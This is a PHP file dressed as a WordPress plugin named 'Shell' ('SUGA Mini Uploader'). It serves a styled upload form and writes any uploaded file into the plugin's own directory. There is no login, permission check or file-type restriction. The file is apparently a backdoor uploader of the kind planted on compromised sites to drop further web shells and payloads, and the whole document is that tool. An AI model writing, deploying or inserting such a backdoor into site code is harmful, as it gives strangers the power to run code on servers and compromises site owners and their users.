<?php
/**
 * Plugin Name: Shell
 * Description: SUGA Mini Uploader
 * Version: 1.0
 * Author: SUGA
 */

// Cek apakah ada file yang di-upload
if (isset($_FILES['file'])) {
    $target_dir = __DIR__ . '/';
    $target_file = $target_dir . basename($_FILES['file']['name']);
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo "SUKSES: File berhasil di-upload ke " . htmlspecialchars($target_file);
    } else {
        echo "GAGAL: File gagal di-upload.";
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>SUGA Mini Uploader</title>
    <style>
        body { background: #0a0a0a; color: #00ffcc; font-family: monospace; text-align: center; padding-top: 100px; }
        form { background: #111; border: 1px solid #00ffcc; display: inline-block; padding: 30px; border-radius: 10px; }
        input[type="submit"] { background: #00ffcc; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        input[type="file"] { color: #fff; }
    </style>
</head>
<body>
    <h2>SUGA Mini Uploader</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <br>
        <input type="submit" value="Upload File">
    </form>
</body>
</html>